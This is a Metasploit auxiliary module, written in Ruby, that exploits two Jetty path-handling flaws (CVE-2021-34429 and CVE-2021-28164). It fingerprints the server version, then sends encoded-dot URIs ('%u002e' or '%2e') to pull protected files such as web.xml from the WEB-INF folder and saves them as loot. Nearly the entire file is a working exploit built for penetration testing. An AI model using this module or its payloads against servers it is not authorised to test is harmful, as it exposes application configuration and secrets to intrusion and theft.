##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Jetty WEB-INF File Disclosure',
        'Description' => %q{
          Jetty suffers from a vulnerability where certain encoded URIs and ambiguous paths can access
          protected files in the WEB-INF folder. Versions effected are:
          9.4.37.v20210219, 9.4.38.v20210224 and 9.4.37-9.4.42, 10.0.1-10.0.5, 11.0.1-11.0.5.
          Exploitation can obtain any file in the WEB-INF folder, but web.xml is most likely
          to have information of value.
        },
        'Author' => [
          'h00die', # msf module
          'Mayank Deshmukh', # EDB module
          'cangqingzhe', # CVE-2021-34429
          'lachlan roberts <lachlan@webtide.com>', # CVE-2021-34429
          'charlesk40' # CVE-2021-28164
        ],
        'References' => [
          [ 'EDB', '50438' ],
          [ 'EDB', '50478' ],
          [ 'URL', 'https://github.com/ColdFusionX/CVE-2021-34429' ],
          [ 'URL', 'https://github.com/eclipse/jetty.project/security/advisories/GHSA-vjv5-gp2w-65vm' ], # CVE-2021-34429
          [ 'URL', 'https://github.com/eclipse/jetty.project/security/advisories/GHSA-v7ff-8wcx-gmc5' ], # CVE-2021-28164
          [ 'CVE', '2021-34429' ],
          [ 'CVE', '2021-28164' ]
        ],
        'License' => MSF_LICENSE,
        'Notes' => {
          'Stability' => [ CRASH_SAFE ],
          'Reliability' => [ ],
          'SideEffects' => [ IOC_IN_LOGS ]
        },
        'DisclosureDate' => '2021-07-15',
        'Actions' => [
          [ 'READ_FILE', { 'Description' => 'Read file on the remote server from WEB-INF folder' } ],
        ],
        'DefaultAction' => 'READ_FILE'
      )
    )
    register_options([
      Opt::RPORT(8080),
      OptString.new('FILE', [false, 'File in WEB-INF to retrieve', 'web.xml']),
      OptEnum.new('CVE', [true, 'The vulnerability to use', 'CVE-2021-34429', ['CVE-2021-34429', 'CVE-2021-28164']])
    ])
  end

  def check
    res = send_request_cgi('uri' => '/')
    return Exploit::CheckCode::Unknown("#{peer} - Could not connect to web service - no response") if res.nil?
    return Exploit::CheckCode::Safe("#{peer} - Check URI Path, unexpected HTTP response code: #{res.code}") unless res.code == 200
    return Exploit::CheckCode::Safe("#{peer} - No Server header found") unless res.headers['Server']
    unless /Jetty\((?<version>[^)]+)\)/ =~ res.headers['Server']
      return Exploit::CheckCode::Safe("#{peer} - Unable to detect Jetty version from server header: #{res.headers['Server']}")
    end

    vprint_status("Found version: #{version}")
    version = Rex::Version.new(version)

    if version == Rex::Version.new('9.4.37.v20210219') || version == Rex::Version.new('9.4.38.v20210224')
      print_good("#{version} vulnerable to CVE-2021-28164")
      return Exploit::CheckCode::Detected
    elsif version.between?(Rex::Version.new('9.4.37'), Rex::Version.new('9.4.43')) ||
          version.between?(Rex::Version.new('10.0.1'), Rex::Version.new('10.0.6')) ||
          version.between?(Rex::Version.new('11.0.1'), Rex::Version.new('11.0.6'))
      print_good("#{version} vulnerable to CVE-2021-34429")
      return Exploit::CheckCode::Appears
    end

    Exploit::CheckCode::Safe('Server not vulnerable')
  end

  def pick_payload
    case datastore['CVE']
    when 'CVE-2021-34429'
      payload = '%u002e'
    when 'CVE-2021-28164'
      payload = '%2e'
    end

    payload
  end

  def run
    res = send_request_cgi('uri' => "/#{pick_payload}/WEB-INF/#{datastore['FILE']}")
    fail_with(Failure::Unreachable, "#{peer} - Could not connect to web service - no response") if res.nil?
    fail_with(Failure::UnexpectedReply, "#{peer} - Check URI Path, unexpected HTTP response code: #{res.code}") unless res.code == 200
    path = store_loot("jetty.#{datastore['FILE']}", 'text/plain', target_host, res.body, datastore['FILE'], 'Jetty WEB-INF File')
    print_good("File stored to #{path}")
    print_good(res.body)
  end

end
